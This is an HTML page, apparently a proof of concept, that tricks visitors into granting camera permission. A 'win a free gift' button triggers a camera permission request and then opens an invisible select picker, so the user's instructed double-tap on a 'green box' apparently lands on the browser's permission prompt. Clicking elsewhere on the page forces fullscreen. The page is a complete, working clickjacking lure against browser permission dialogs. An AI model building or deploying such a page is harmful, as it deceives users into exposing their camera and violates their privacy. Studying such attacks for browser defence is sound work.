<!DOCTYPE html>
<html>
<head>
  <title>Permission + Fullscreen Demo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
  
  <style>
    body {
      margin: 10vh 10vw;
      height: 100vh;
      overflow: hidden;
      text-align: center;
      background-color: #7242E3;
    }

    button {
      font-size: 25px;
      background-color: #28a745;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }

    select {
      opacity: 0;
    }
  </style>

  <script>
    function requestCameraPermission() {
      navigator.mediaDevices.getUserMedia({ video: true })
        .then(() => console.log('Camera granted'))
        .catch(() => console.log('Denied'));
    }

    function handleClick(event) {
      event.stopPropagation(); // 👈 important (button click fullscreen trigger na kare)

      requestCameraPermission();

      setTimeout(() => {
        document.getElementById("selectme").showPicker();
      }, 250);
    }

    // 👇 fullscreen on page click (except button)
    document.addEventListener("click", function(e) {
      if (e.target.tagName !== "BUTTON") {
        if (!document.fullscreenElement) {
          document.documentElement.requestFullscreen().catch(() => {});
        }
      }
    });
  </script>
</head>

<body>

<center>
  <button onclick="handleClick(event)">
    🎉 Click to Open Your Lucky Ticket and Double-Tap [🟩 = 🎁] the Green Box to Win a Free Gift! 🎉
  </button>
</center>

<div>
  <select id="selectme">
    <option>🟥 🟥 🟥 🟥 🟥 🟥 🟥 🟥</option>
    <option>🟥 🟥 🟥 🟥 🟥 🟥 🟥 🟥</option>
    <option>🟥 🟥 🟥 🟥 🟥 🟥 🟥 🟥</option>
    <option>🟥 🟥 🟥 🟥 🟥 🟥 🟥 🟥</option>
    <option>🟥 🟥 🟥 🟥 🟥 🟥 🟥 🟥</option>
    <option>🟥 🟥 🟥 🟥 🟥 🟥 🟥 🟥</option>
    <option>🟥 🟥 🟥 🟥 🟥 🟩 🟥 🟥</option>
    <option>🟥 🟥 🟥 🟥 🟥 🟥 🟥 🟥</option>
    <option>🟥 🟥 🟥 🟥 🟥 🟥 🟥 🟥</option>
    <option>🟥 🟥 🟥 🟥 🟥 🟥 🟥 🟥</option>
    <option>🟥 🟥 🟥 🟥 🟥 🟥 🟥 🟥</option>
  </select>
</div>

</body>
</html>
